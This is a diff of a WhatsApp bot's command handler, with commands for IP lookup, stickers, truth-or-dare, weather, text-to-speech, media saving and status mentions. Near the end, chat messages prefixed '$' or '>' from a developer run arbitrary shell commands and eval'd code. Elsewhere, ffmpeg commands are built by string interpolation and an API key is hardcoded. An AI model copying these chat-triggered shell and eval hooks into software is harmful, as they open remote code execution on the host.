+ - ISP: ${info.connection?.isp || 'N/A'}
+ - Domain: ${info.connection?.domain || 'N/A'}
+• Timezone:
+ - ID: ${info.timezone?.id || 'N/A'}
+ - Abbreviation: ${info.timezone?.abbr || 'N/A'}
+ - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
+ - Offset: ${info.timezone?.offset || 'N/A'}
+ - UTC: ${info.timezone?.utc || 'N/A'}
+ - Current Time: ${info.timezone?.current_time || 'N/A'}
+`;
+};
+ 
+if (!res.success) throw new Error(`IP ${text} not found!`);
+await ednut.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+await delay(2000);
+m.reply(formatIPInfo(res)); 
+} catch (e) { 
+await m.reply(`Error: Unable to retrieve data for IP ${text}`);
+}
+}
+break
+
+case 'fancy': case 'styletext': {
+  if (m.isGroup) {
+    if (global.db.groups[m.chat].banned) return
+  }
+  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!text) return m.reply(example('Enter Query text!'))
+  let args = text.split(' ')
+  let styleNumber = parseInt(args[0])
+  let query = text.replace(args[0], '').trim()
+  if (isNaN(styleNumber) || !query) {
+    let anu = await styletext(text)
+    let teks = `eg use ${prefix}fancy 2 text for a specific text\nStyle Text: ${text}\n`
+    for (let i = 0; i < anu.length; i++) {
+      teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`
+    }
+    return await m.reply(teks)
+  }
+  let anu = await styletext(query)
+  if (styleNumber && anu[styleNumber - 1]) {
+    return m.reply(anu[styleNumber - 1].result)
+  } else {
+    return m.reply('Invalid style number')
+  }
+} 
+break
+
+case 'charge': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+const { performance } = require('perf_hooks'); // For measuring latency
+let startTime = performance.now(); // Start time
+// Construct the initial message
+let initialMessage = 
+ `battery 🪫 low
+╔═══════════╗
+║░░░░░░░░░░░╚╗
+║░░░░░1%░░░░░░║
+║░░░░░░░░░░░╔╝
+╚═══════════╝`;
+
+try {
+// Send the initial message and get the message ID
+let sentMessage = await ednut.sendMessage(m.chat, { text: initialMessage });
+let initialMessageId = sentMessage.key.id; // Use sentMessage.key.id for the message ID
+// Schedule the first edit after 2 seconds
+setTimeout(async () => {
+try {
+await ednut.sendMessage(m.chat, {
+text: `🪫 _Charging..._
+╔═══════════╗
+║██░░░░░░░░░╚╗
+║██░░░⚡░░░░░░║
+║██░░░░░░░░░╔╝
+╚═══════════╝`,
+edit: { remoteJid: m.chat, id: initialMessageId }
+});
+console.log('First edit successful.');
+} catch (error) {
+console.error('Error during first edit:', error);
+}
+}, 2000); // 2000 ms = 2 seconds
+// Schedule the second edit after 4 seconds
+setTimeout(async () => {
+try {
+await ednut.sendMessage(m.chat, {
+text: `🪫 _Charging..._
+╔═══════════╗
+║████░░░░░░░╚╗
+║████░30%░░░░░║
+║████░░░░░░░╔╝
+╚═══════════╝`,
+edit: { remoteJid: m.chat, id: initialMessageId }
+});
+console.log('Second edit successful.');
+} catch (error) {
+console.error('Error during second edit:', error);
+}
+}, 4000); // 4000 ms = 4 seconds
+// Schedule the third edit after 6 seconds
+setTimeout(async () => {
+try {
+await ednut.sendMessage(m.chat, {
+text: `🔋 _Charging..._
+╔═══════════╗
+║██████░░░░░╚╗
+║█████░50%░░░░║
+║██████░░░░░╔╝
+╚═══════════╝`,
+edit: { remoteJid: m.chat, id: initialMessageId }
+});
+console.log('Third edit successful.');
+} catch (error) {
+console.error('Error during third edit:', error);
+}
+}, 6000); // 6000 ms = 6 seconds
+// Schedule the fourth edit after 8 seconds
+setTimeout(async () => {
+try {
+await ednut.sendMessage(m.chat, {
+text: `🔋 _Charging..._
+╔═══════════╗
+║█████████░░╚╗
+║███░75%░░█░░░║
+║█████████░░╔╝
+╚═══════════╝`,
+edit: { remoteJid: m.chat, id: initialMessageId }
+});
+console.log('Fourth edit successful.');
+} catch (error) {
+console.error('Error during fourth edit:', error);
+}
+}, 8000); // 8000 ms = 8 seconds
+
+// Schedule the fifth edit after 10 seconds
+setTimeout(async () => {
+try {
+await ednut.sendMessage(m.chat, {
+text: `🔋~_.Charged._~
+╔═══════════╗
+║███████████╚╗
+║███░100%░████║
+║███████████╔╝
+╚═══════════╝`,
+edit: { remoteJid: m.chat, id: initialMessageId }
+});
+console.log('Fifth edit successful.');
+} catch (error) {
+console.error('Error during fifth edit:', error);
+}
+}, 10000); // 10000 ms = 10 seconds
+// Schedule the final message after 12 seconds
+setTimeout(async () => {
+try {
+await ednut.sendMessage(m.chat, {
+text: ` 💜😽𝙳𝚎𝚊𝚛 reader 🌚❤️
+
+       ｡ﾟﾟ･｡･ﾟﾟ｡
+         ﾟ。        ｡ﾟ
+             ﾟ･｡･ﾟ
+       ︵               ︵
+    (        ╲       /       /
+      ╲          ╲/       /
+           ╲          ╲  /
+          ╭ ͡   ╲           ╲
+     ╭ ͡   ╲        ╲       ﾉ
+╭ ͡   ╲        ╲         ╱
+ ╲       ╲          ╱
+      ╲         ╱
+          ︶
+> -𝙸 𝚕𝚘𝚟𝚎 𝚞 𝚌𝚊𝚗 𝚒 𝚐𝚎𝚝 𝚒𝚝 𝚋𝚊𝚌𝚔🥺♥️
+> 𝐂𝐫𝐞𝐝𝐢𝐭:- Silentzbotid`,
+edit: { remoteJid: m.chat, id: initialMessageId }
+});
+console.log('Final edit successful.');
+} catch (error) {
+console.error('Error during final edit:', error);
+}
+}, 12000); // 12000 ms = 12 seconds
+} catch (error) {
+console.error('Error sending initial message:', error);
+}
+}
+break;
+
+
+case 'support': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+const support = `channel:- https://whatsapp.com/channel/0029VbAQfFGBVJl6W26JXy2n\n\ngroup1:- https://chat.whatsapp.com/JEqGxcldMOP0wojK4TTstw\n\ngroup2:- https://chat.whatsapp.com/GmHOFOqQsM8A160ZCjcVnb!`
+m.reply(support)
+}
+break
+
+case 'steal': case 'stickerwm': case 'take': case 'wm': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!/image|video/.test(mime)) return m.reply(example("reply to a sticker to steal"))   
+const getRandom = (ext) => {
+return `${Math.floor(Math.random() * 10000)}${ext}`
+  }
+	let ahuh = args.join(' ').split('|')
+	let satu = ahuh[0] !== '' ? ahuh[0] : (m.pushName)
+	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
+	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
+	let media = await ednut.downloadAndSaveMediaMessage(quoted)
+	let jancok = new Sticker(media, {
+	pack: satu, // The pack name
+	author: dua, // The author name
+	type: StickerTypes.FULL, // The sticker type
+	categories: ['🤩', '🎉'], // The sticker category
+	id: '12345', // The sticker id
+	quality: 70, // The quality of the output file
+	background: '#FFFFFF00' // The sticker background color (only for full stickers)
+	})
+	let stok = getRandom(".webp")
+	let nono = await jancok.toFile(stok)
+	let nah = fs.readFileSync(nono)
+	await ednut.sendMessage(m.chat,{sticker: nah},{quoted: m})
+	await fs.unlinkSync(stok)
+	await fs.unlinkSync(media)
+}
+break
+			
+			case 'dare':
+			if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+              const dare =[             
+"Send a funny face selfie to the group", "Tell a secret about yourself that no one knows", "Sing a song out loud and record it, then send it to the group", "Do 10 push-ups and send a video as proof", "Send a voice note saying 'I love you' to a random contact", "Share your most embarrassing moment", "Send a photo of your favorite food", "Write a short poem and share it with the group", "Do a funny dance and send a video", "Call a friend and have a 5-minute conversation in a made-up language", "Send a photo of your bedroom", "Share your biggest fear", "Send a voice note of you singing a popular song", "Tell a joke and make everyone laugh", "Send a photo of your favorite hobby", "Write a short story and share it with the group", "Do 5 jumping jacks and send a video as proof", "Share your favorite quote", "Send a photo of your favorite book", "Call a friend and have a 10-minute conversation without laughing", "Send a voice note saying 'I'm sorry' to someone you wronged", "Share your most proud moment", "Send a photo of your favorite sports team", "Write a love letter to your crush", "Do a funny impression of a friend and send a video", "Share your biggest regret", "Send a photo of your favorite animal", "Tell a scary story and make everyone believe it", "Send a voice note of you rapping a popular song", "Share your favorite travel destination", "Send a photo of your favorite type of music", "Write a poem about a friend and share it with the group", "Do 10 sit-ups and send a video as proof", "Share your favorite type of food", "Send a photo of your favorite type of car", "Tell a joke in a made-up language", "Send a voice note saying 'Thank you' to someone who helped you", "Share your most embarrassing habit", "Send a photo of your favorite type of music instrument", "Write a short script and act it out with friends", "Do a funny skit and send a video", "Share your favorite type of sport", "Send a photo of your favorite type of pet", "Tell a story about a friend's embarrassing moment", "Send a voice note of you beatboxing a popular song", "Share your favorite type of video game", "Send a photo of your favorite type of movie", "Write a love letter to your best friend", "Do a funny magic trick and send a video", "Share your favorite type of TV show"
+]
+              const archdare = dare[Math.floor(Math.random() * dare.length)]
+              await ednut.sendMessage(m.chat, {text: archdare}, {quoted: m})
+              break
+              
+              	case 'truth':
+              	if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+              const truth =[
+"If you could go back in time, what would you change?", "What's the biggest lie you've ever told?", "What's your deepest fear?", "What's the one thing you can't live without?", "Who's your celebrity crush?", "What's the most embarrassing thing that's ever happened to you?", "What's your biggest regret?", "What's the one thing you're proud of accomplishing?", "If you could switch lives with someone for a day, who would it be?", "What's the biggest secret you've ever kept?", "What's your favorite childhood memory?", "What's the one thing you're looking forward to doing in the next year?", "If you could travel anywhere in the world, where would you go?", "What's your favorite hobby and why do you enjoy it?", "What's the most spontaneous thing you've ever done?", "What's your favorite type of music and why?", "If you could have dinner with any historical figure, who would it be?", "What's the biggest risk you've ever taken?", "What's your favorite type of book and why?", "If you could go on a date with any celebrity, who would it be?", "What's the one thing you're most proud of about yourself?", "What's your favorite type of movie and why?", "If you could switch lives with your parents for a day, what would you do?", "What's the biggest lesson you've learned from a past relationship?", "What's your favorite type of food and why?", "If you could have any superpower, what would it be?", "What's the one thing you're most grateful for in your life?", "What's your favorite type of sport and why?", "If you could go back and give advice to your younger self, what would it be?", "What's the biggest challenge you've faced and how did you overcome it?", "What's your favorite type of music festival and why?", "If you could have a 30-minute conversation with your future self, what would you ask?", "What's the one thing you're most looking forward to doing in the next 5 years?", "What's your favorite type of vacation and why?", "If you could have any type of pet, what would it be?", "What's the biggest thing you're currently struggling with?", "What's your favorite type of holiday and why?", "If you could go on a road trip with any celebrity, who would it be?", "What's the one thing you're most proud of accomplishing in the past year?", "What's your favorite type of restaurant and why?"
+]
+              const archtruth = truth[Math.floor(Math.random() * truth.length)]
+              await ednut.sendMessage(m.chat, {text: archtruth}, {quoted: m})
+              break
+              
+case 'weather':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example('location'))
+            let wdata = await axios.get(
+                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
+            );
+            let textw = ""
+            textw += `*🗺️Weather of  ${text}*\n\n`
+            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
+            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
+            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
+            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
+            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
+            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
+            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
+            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
+            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
+            textw += `*Country:-* ${wdata.data.sys.country}\n`
+
+           ednut.sendMessage(
+                m.chat, {
+                    text: textw,
+                }, {
+                    quoted: m,
+                }
+           )
+           }
+           break
+
+case 'getpp': 
+case 'pp': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  let users = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net')
+  try {
+    avatar = await ednut.profilePictureUrl(users, "image")
+  } catch {
+    avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+  }
+  await ednut.sendMessage(m.chat, {image: {url: avatar }, caption: `Profile picture of @${users.split('@')[0]}`, contextInfo: { mentionedJid: [users] } }, {quoted: m })
+} 
+break
+
+case 'ban': {
+if (!isOwner) return m.reply(msg.owner)
+let Ednut = '2347036214381'
+let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
+if (!user) return m.reply(example('Reply or tag a user!'))
+if (user === botNumber) return m.reply('I cannot ban myself!')
+if (user === Ednut +"@s.whatsapp.net") return m.reply('I cannot ban my Creator!')
+if (!global.db.users[user]) global.db.users[user] = {}
+if (global.db.users[user].banned) return m.reply(`User ${user.split('@')[0]} is already banned!`)
+global.db.users[user].banned = true
+m.reply(`User ${user.split('@')[0]} has been banned from using the bot command!`)
+}
+break
+
+case 'unban': {
+if (!isOwner) return m.reply(msg.owner)
+let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
+if (!user) return m.reply(example('Reply or tag a user!'))
+if (!global.db.users[user]) global.db.users[user] = {}
+if (!global.db.users[user].banned) return m.reply(`User ${user.split('@')[0]} is not banned!`)
+global.db.users[user].banned = false
+m.reply(`User ${user.split('@')[0]} has been unbanned and can now use the bot!`)
+}
+break
+
+case 'say': case 'tts': case 'gtts':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+    try {
+    let text = (args.length > 1) ? args.slice(1).join(" ") : q;
+     if (!text){
+        return m.reply(`*Missing text!*\n\nUse one of the following voice styles:\n
+🔊 *Available Voices:*
+• \`male\` – American Male (default)
+• \`female\` – British Female
+• \`deep\` – Deep Male
+• \`slow\` – Slower Speech
+• \`fast\` – Faster Speech
+• \`ng\` – Nigerian Accent
+• \`au\` – Australian Accent
+
+📝 *Usage Examples:*
+• .tts male Hello there
+• .tts female Welcome to the group
+• .tts deep This is a deep voice
+• .tts ng How are you all today?
+
+Use any style + your text after the command.`);
+      }
+      
+      let voiceLanguage = 'en-US';
+      let speed = false;
+      const style = args[0]?.toLowerCase();
+      
+      switch (style) {
+        case "male":
+          voiceLanguage = "en-US";
+          break;
+        case "female":
+          voiceLanguage = "en-GB";
+          break;
+        case "deep":
+          voiceLanguage = "en-IN";
+          break;
+        case "slow":
+          speed = true;
+          break;
+        case "fast":
+          speed = false;
+          break;
+        case "ng":
+          voiceLanguage = "en-NG";
+          break;
+        case "au":
+          voiceLanguage = "en-AU";
+          break;
+        default:
+          voiceLanguage = "en-US";
+      }
+  
+      if (text.length > 200) return m.reply("❌ Please keep the text under 200 characters.");
+      
+      const url = googleTTS.getAudioUrl(text, {
+        lang: voiceLanguage,
+        slow: speed,
+        host: 'https://translate.google.com'
+      });
+      
+      await ednut.sendMessage(from, {
+        audio: { url },
+        mimetype: 'audio/mpeg',
+        ptt: true
+      }, { quoted: m });
+      
+    } catch (err) {
+      console.error("TTS Error:", err);
+      m.reply("❌ Error generating speech. Try again later.");
+    }
+}
+break
+        
+case 'repo': case 'repository': {
+  try {
+    const response = await axios.get(`https://api.github.com/repos/Ednut001/Arch-Md`)
+    if (response.status === 200) {
+      const repoData = response.data
+      const formattedInfo = `*Repository Name :* ${repoData.name}\n*Description :* ${repoData.description}\n*Owner :* ${repoData.owner.login}\n*Stars :* ${repoData.stargazers_count}\n*Forks :* ${repoData.forks_count}\n*session :* ${global.scan}\n\n*URL :* ${repoData.html_url}\n`;
+      reply4(formattedInfo);
+    } else {
+      await m.reply(`Unable to fetch repository information`)
+    }
+  } catch (error) {
+    console.error(error)
+    await m.reply(`Repository currently not available `)
+  }
+}
+break
+
+case 'twitter': case 'twitterdl': case 'twitterdl': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+    if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+	if (!args[0]) return m.reply(example(`media link`))
+	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return m.reply('Link Invalid!')
+          try {
+          let { SD, HD, desc, thumb, audio } = await api.twitter(args[0])
+          let te = ` 
+° Description: ${desc}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵`
+ednut.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
+} catch (e) {
+  	m.reply(`Verify that the link is from Twitter`)
+	}
+}
+break
+
+  case 'banchat':
+  case 'bangc':{
+    if (!m.isGroup) return m.reply(msg.group)
+    if (!isOwner) return m.reply(msg.owner)
+    if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
+    if (global.db.groups[m.chat].banned === true) return m.reply('this group has already been banned from using the bot command earlier!')
+    global.db.groups[m.chat].banned = true
+    m.reply(`Ban group feature enabled ${botname} won't work here!`)
+    }
+    break;
+    
+
+case 'autobio': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (args[0] === 'on') {
+if (global.db.settings.autobio === true) return m.reply('Auto bio already enabled!')
+global.db.settings.autobio = true
+m.reply('Auto bio enabled!')
+} else if (args[0] === 'off') {
+if (global.db.settings.autobio === false) return m.reply('Auto bio already disabled!')
+global.db.settings.autobio = false
+m.reply('Auto bio disabled!')
+} else {
+m.reply(example('on/off'))
+}
+}
+break;
+
+case 'antidelete': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (args[0] === 'on') {
+if (global.db.settings.antidelete === true) return m.reply('Antidelete already enabled!')
+global.db.settings.antidelete = true
+m.reply('Antidelete enabled!')
+} else if (args[0] === 'off') {
+if (global.db.settings.antidelete === false) return m.reply('Antidelete already disabled!')
+global.db.settings.antidelete = false
+m.reply('Antidelete disabled!')
+} else {
+m.reply(example('on/off'))
+}
+}
+break;
+
+case 'autolevelup': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (args[0] === 'on') {
+if (global.db.settings.levelup === true) return m.reply('Autolevelup already enabled!')
+global.db.settings.levelup = true
+m.reply('Autolevelup enabled!')
+} else if (args[0] === 'off') {
+if (global.db.settings.levelup === false) return m.reply('Autolevelup already disabled!')
+global.db.settings.levelup = false
+m.reply('Autolevelup disabled!')
+} else {
+m.reply(example('on/off'))
+}
+}
+break;
+
+
+case 'download':
+case 'save':
+case 'sv': {
+  if (m.isGroup) {
+    if (global.db.groups[m.chat].banned) return
+  }
+  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  if (!isOwner) return
+  let quotedMessage = m.msg.contextInfo.quotedMessage
+  if (!quotedMessage) return m.reply(example("message or reply to chat or media"))
+  if (quotedMessage) {
+    if (quotedMessage.conversation) {
+      ednut.sendMessage(botNumber, { text: quotedMessage.conversation},{quoted: m})
+    }
+    if (quotedMessage) {
+      if (quotedMessage.imageMessage) {
+        let imageCaption = quotedMessage.imageMessage.caption;
+        let imageUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
+        ednut.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption},{quoted: m});
+      }
+       if (quotedMessage) {
+      if (quotedMessage.audioMessage) {;
+        let audioUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
+        ednut.sendMessage(botNumber, {audio: {url: audioUrl}, mimetype: "audio/mpeg"},{quoted: m})
+      }
+      if (quotedMessage.videoMessage) {
+        let videoCaption = quotedMessage.videoMessage.caption;
+        let videoUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
+        ednut.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption}, {quoted: m});
+      }
+    }
+    }
+  }
+}
+break
+
+case 'unbanchat':
+case 'unbangc': {
+if (!m.isGroup) return m.reply(msg.group)
+if (!isOwner) return m.reply(msg.owner)
+if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
+if (global.db.groups[m.chat].banned === false) return m.reply('This group is not banned from using the bot command!')
+global.db.groups[m.chat].banned = false
+m.reply(`Ban group feature disabled ${botname} can now be used here!`)
+}
+break;
+
+case "autosend": case "astatus": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+if (args.length < 1) return m.reply(example("on/off"))
+if (args[0] === "on") {
+if (global.db.settings.send) return m.reply('Already on')
+global.db.settings.send = true
+m.reply('Autosend turned on successfully')
+} else if (args[0] === "off") {
+if (!global.db.settings.send) return m.reply('Already off')
+global.db.settings.send = false
+m.reply('Autosend turned off successfully')
+}
+}
+break
+
+case 'pindl': case 'img':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+   if (!text) return m.reply(example(`query 3 or url`))
+    let [query, count] = text.split(' ')
+    let imgCount = 5
+    if (text.indexOf(' ') !== -1) {
+        const lastWord = text.split(' ').pop()
+        if (!isNaN(lastWord) && lastWord.trim() !== '') {
+            imgCount = parseInt(lastWord)
+            query = text.substring(0, text.lastIndexOf(' '))
+        } else {
+            query = text
+        }
+    } else {
+        query = text
+    }
+    try {
+        const results = await pinterest(query)
+        if (results.length === 0) return m.reply(`No results found for "${query}". Try another search term.`)
+        const imagesToSend = Math.min(results.length, imgCount)
+        m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`)
+        for (let i = 0; i < imagesToSend; i++) {
+            await ednut.sendMessage(m.chat, { image: { url: results[i].image } }) 
+        }
+    } catch {
+        m.reply('Error occurred while fetching Pinterest images. Please try again later.')
+    }
+}
+break
+
+
+case 'setcmd':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+global.db.sticker = global.db.sticker || {}
+    if (!m.quoted) return m.reply(example('reply a sticker'))
+    if (!m.quoted.fileSha256) return m.reply('SHA256 Hash Missing')
+    if (!text) return m.reply(example(`text`))
+    let sticker = global.db.sticker
+    let hash = m.quoted.fileSha256.toString('base64')
+    if (sticker[hash] && sticker[hash].locked) return m.reply('You do not have permission to change this sticker command.')
+    sticker[hash] = {
+        text,
+        mentionedJid: m.mentionedJid,
+        creator: m.sender,
+        at: + new Date,
+        locked: false,
+    }
+    m.reply(`Succeess!`)
+}
+break
+
+case 'delcmd':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+let hash = text
+    if (m.quoted && m.quoted.fileSha256) hash = m.quoted.fileSha256.toString('hex')
+    if (!hash) return m.reply(`hash not found`)
+    let sticker = global.db.sticker
+    if (sticker[hash] && sticker[hash].locked) return m.reply('You dont have permission to delete this sticker command')
+    delete sticker[hash]
+    m.reply(`sucess`)
+}
+break
+
+case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+                try {
+                let set
+                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
+                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
+                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
+                if (/earrape/.test(command)) set = '-af volume=12'
+                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
+                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
+                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
+                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
+                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
+                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
+                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
+                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
+                if (/audio/.test(mime)) {
+                let media = await ednut.downloadAndSaveMediaMessage(quoted)
+                let ran = getRandom('.mp3')
+                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
+                fs.unlinkSync(media)
+                if (err) return m.reply(err)
+                let buff = fs.readFileSync(ran)
+                ednut.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
+                fs.unlinkSync(ran)
+                })
+                } else m.reply(example(`reply to an audio`))
+                } catch (e) {
+                m.reply(e)
+                }
+                break
+
+
+case 'status': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+    const baileys = require("baileys");
+
+    async function fetchParticipants(...jids) {
+        let results = [];
+        for (const jid of jids) {
+            let { participants } = await ednut.groupMetadata(jid);
+            participants = participants.map(({ id }) => id);
+            results = results.concat(participants);
+        }
+        return results;
+    }
+
+    async function mentionStatus(jids, content) {
+        const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, {
+            upload: ednut.waUploadToServer
+        });
+
+        let statusJidList = [];
+        for (const _jid of jids) {
+            if (_jid.endsWith("@g.us")) {
+                for (const jid of await fetchParticipants(_jid)) {
+                    statusJidList.push(jid);
+                }
+            } else {
+                statusJidList.push(_jid);
+            }
+        }
+        statusJidList = [...new Set(statusJidList)];
+
+        await ednut.relayMessage(msg.key.remoteJid, msg.message, {
+            messageId: msg.key.id,
+            statusJidList,
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: jids.map((jid) => ({
+                                tag: "to",
+                                attrs: { jid },
+                                content: undefined
+                            }))
+                        }
+                    ]
+                }
+            ]
+        });
+
+        for (const jid of jids) {
+            let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
+            await ednut.relayMessage(jid, {
+                [type]: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
+                }
+            }, {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: { is_status_mention: "true" },
+                        content: undefined
+                    }
+                ]
+            });
+        }
+
+        return msg;
+    }
+
+    let q = m.quoted ? m.quoted : m;
+    let mime = (q.msg || q).mimetype || '';
+    let content = {};
+
+    if (mime) {
+        let media = await q.download();
+
+        if (/image/.test(mime)) {
+            content.image = media;
+        } else if (/video/.test(mime)) {
+            content.video = media;
+        } else if (/audio/.test(mime)) {
+            content.audio = media;
+        } else {
+            return m.reply("File types are not supported!!");
+        }
+
+        if (q.text) content.caption = q.text;
+    } else if (args[0]) {
+        let url = args[0];
+        let type = args[1] || 'text';
+
+        if (type === 'image') {
+            content.image = { url };
+        } else if (type === 'video') {
+            content.video = { url };
+        } else if (type === 'audio') {
+            content.audio = { url };
+        } else {
+            content.text = args.slice(1).join(" ") || url;
+        }
+    } else {
+        return m.reply(`Reply Media or enter the URL with the format: \n${global.prefix} status <URL> <Image/Video/Audio/Text>\nnote only the group posted from will be mentioned`);
+    }
+    mentionStatus([m.chat], content).catch(console.error);
+}
+break;
+//================================================================================
+
+
+
+default:
+
+if (budy.startsWith('=>')) {
+            if (!isDev) return;
+            function Return(sul) {
+                sat = JSON.stringify(sul, null, 2);
+                bang = util.format(sat);
+                if (sat == undefined) {
+                    bang = util.format(sul);
+                }
+                return m.reply(bang);
+            }
+            try {
+                m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
+            } catch (e) {
+                m.reply(String(e));
+     }
+}
+   
+        
+if (budy.startsWith('$')) {
+            if (!isDev) return;
+            require("child_process").exec(budy.slice(2), (err, stdout) => {
+            if (err) return m.reply(`${err}`);
+            if (stdout) return m.reply(stdout);
+      });
+}             
+                       
+        
+if (budy.startsWith('>')) {
+if (!isDev) return
+try {
+let evaled = await eval(budy.slice(2))
+if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+await m.reply(evaled)
+} catch (err) {
+m.reply(String(err))
+}
+}
+
+
+}} catch (err) {
+console.log(err)
+/*let e = String(err)
+ednut.sendMessage(`${owner}@s.whatsapp.net`, { text: e, 
+contextInfo:{
+forwardingScore: 9999999, 
+isForwarded: true
+}})
+*/
+}
+
+}
+let file = require.resolve(__filename)
+fs.watchFile(file, () => {
+    fs.unwatchFile(file)
+    console.log(chalk.redBright(`Update ${__filename}`))
+    delete require.cache[file]
+    require(file)
+})
+               
+process.on('uncaughtException', function (err) {
+console.log('Caught exception: ', err)
+})
